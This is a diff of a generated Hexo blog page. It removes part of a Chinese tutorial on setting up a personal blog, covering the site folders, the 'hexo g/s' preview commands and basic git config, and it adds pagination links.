-<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/cmd.jpg" alt="1234"></p>
-<h4 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h4><p>这是网站的配值信息，可以在此配置大部分的参数。</p>
-<h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p>这是存放用户资源的地方，文章会存放在其中的_posts文件夹下，而一些标签、归档则是在source文件夹下。</p>
-<h4 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h4><p>主题文件夹，Hexo 会根据主题来生成静态页面，博客所用的各种主题都存放在此目录下。</p>
-<h4 id="5-git的基本操作"><a href="#5-git的基本操作" class="headerlink" title="5.git的基本操作"></a>5.git的基本操作</h4><p>安装上诉步骤简单部署好以后，输入以下命令，然后本地localhost:4000访问，就可以看到自己的博客了~</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/4000.png" alt="1234"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;email@example.com&quot;</span><br></pre></td></tr></table></figure>
-
-<p>因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。你也许会担心，如果有人故意冒充别人怎么办？这个不必担心，首先我们相信大家都是善良无知的群众，其次，真的有冒充的也是有办法可查的。</p>
-<p>注意<code>git config</code>命令的<code>--global</code>参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
-
-      
-      <!-- reward -->
-      
-    </div>
-    
-    
-      <!-- copyright -->
-      
-    <footer class="article-footer">
-      
-      
-
-    </footer>
-
-  </div>
-
-  
-
-  
-  
-  
-
-  
-
-</article>
-    
   </article>
   
 
+  
+  <nav class="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
+  </nav>
   
 </section>
 </div>
